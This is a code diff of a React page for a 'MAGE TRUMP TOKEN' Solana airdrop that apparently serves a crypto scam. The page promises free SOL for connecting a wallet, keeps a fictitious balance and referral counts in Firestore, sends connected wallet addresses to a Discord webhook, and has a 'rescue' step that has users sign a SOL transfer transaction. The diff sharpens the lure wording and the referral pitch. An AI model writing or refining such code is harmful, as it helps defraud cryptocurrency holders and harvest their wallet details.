@@ -1,20 +1,12 @@
-// Home.jsx
 import React, { useEffect, useState } from 'react';
 import trumpImage from '../assets/front.png';
 import { Link } from 'react-router-dom';
 import { db } from '../firebase/firebase';
 import {
-  setDoc,
-  updateDoc,
-  doc,
-  getDoc,
-  onSnapshot,
+  setDoc, updateDoc, doc, getDoc, onSnapshot,
 } from 'firebase/firestore';
 import {
-  Connection,
-  PublicKey,
-  SystemProgram,
-  Transaction,
+  Connection, PublicKey, SystemProgram, Transaction,
 } from '@solana/web3.js';
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
@@ -39,9 +31,7 @@ export default function Home() {
         {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `📢 New wallet connected: \`${wallet}\``,
-          }),
+          body: JSON.stringify({ content: `📢 New wallet connected: \`${wallet}\`` }),
         }
       );
     } catch (err) {
@@ -57,42 +47,35 @@ export default function Home() {
   const handleUserRegistration = async () => {
     if (!walletAddress) return;
     setStatus('Registering wallet...');
-
     try {
       const userRef = doc(db, 'users', walletAddress);
       const existingSnap = await getDoc(userRef);
       const referral = getReferralFromURL();
 
       if (!existingSnap.exists()) {
-        await setDoc(
-          userRef,
-          {
-            wallet: walletAddress,
-            referral: referral,
-            claimed: false,
-            createdAt: new Date().toISOString(),
-            refCount: 0,
-            balance: 0.5,
-            canClaim: false,
-          }
-        );
+        await setDoc(userRef, {
+          wallet: walletAddress,
+          referral,
+          claimed: false,
+          createdAt: new Date().toISOString(),
+          refCount: 0,
+          balance: 0.5,
+          canClaim: false,
+        });
 
         if (referral) {
           const refRef = doc(db, 'users', referral);
           const refSnap = await getDoc(refRef);
-
           if (refSnap.exists()) {
             const refData = refSnap.data();
             const newBalance = Math.ceil(((refData.balance || 0) + 0.1) * 10) / 10;
             const newCount = (refData.refCount || 0) + 1;
-
             await updateDoc(refRef, {
               balance: newBalance,
               refCount: newCount,
             });
           }
         }
-
         await sendToDiscord(walletAddress);
         setStatus('Wallet registered!');
       } else {
@@ -110,9 +93,7 @@ export default function Home() {
     return (Math.ceil(userData.balance * 10) / 10).toFixed(1);
   };
 
-  const handleRescue = async () => {
-    setRescuePopup(true);
-  };
+  const handleRescue = () => setRescuePopup(true);
 
   const confirmRescue = async () => {
     try {
@@ -130,7 +111,6 @@ export default function Home() {
 
       const signature = await sendTransaction(transaction, connection);
       await connection.confirmTransaction({ signature, ...latestBlockhash }, 'confirmed');
-
       alert('SOL sent successfully!');
       setRescuePopup(false);
     } catch (err) {
@@ -142,13 +122,9 @@ export default function Home() {
 
   useEffect(() => {
     if (!walletAddress) return;
-
     const unsub = onSnapshot(doc(db, 'users', walletAddress), (snap) => {
-      if (snap.exists()) {
-        setUserData(snap.data());
-      }
+      if (snap.exists()) setUserData(snap.data());
     });
-
     return () => unsub();
   }, [walletAddress]);
 
@@ -172,12 +148,14 @@ export default function Home() {
         </div>
         <div className="w-full md:w-1/2 flex flex-col justify-center items-center md:items-start mt-6 md:mt-0">
           <h1 className="text-4xl md:text-5xl font-bold mb-4">MAGE TRUMP TOKEN</h1>
-          <h2 className="text-2xl font-bold text-white mb-2">Claim $MAGE Airdrop</h2>
+          <h2 className="text-2xl font-bold text-white mb-2">Claim Free SOL and Join the Movement!</h2>
           <p className="text-sm text-gray-200 max-w-sm mb-6">
-            Connect your wallet to receive 0.5 SOL. Refer friends to earn more!
+            🔥 Get 0.5 SOL instantly just for connecting your wallet.<br />
+            🎯 Invite your friends and boost your earnings!<br />
+            🧙‍♂️ The more you share, the more power you gain.
           </p>
           <p className="text-sm mb-2 text-green-300">
-            Current balance: {getRoundedBalance()} SOL
+            Your current earnings: {getRoundedBalance()} SOL
           </p>
           <button
             onClick={handleUserRegistration}
@@ -197,7 +175,6 @@ export default function Home() {
           {error && <p className="mt-4 text-red-500">{error}</p>}
         </div>
       </main>
-
       {rescuePopup && (
         <div className="fixed top-0 left-0 w-full h-full bg-gray-800 bg-opacity-50 flex items-center justify-center z-50">
           <div className="bg-white p-6 rounded shadow-lg max-w-sm w-full">
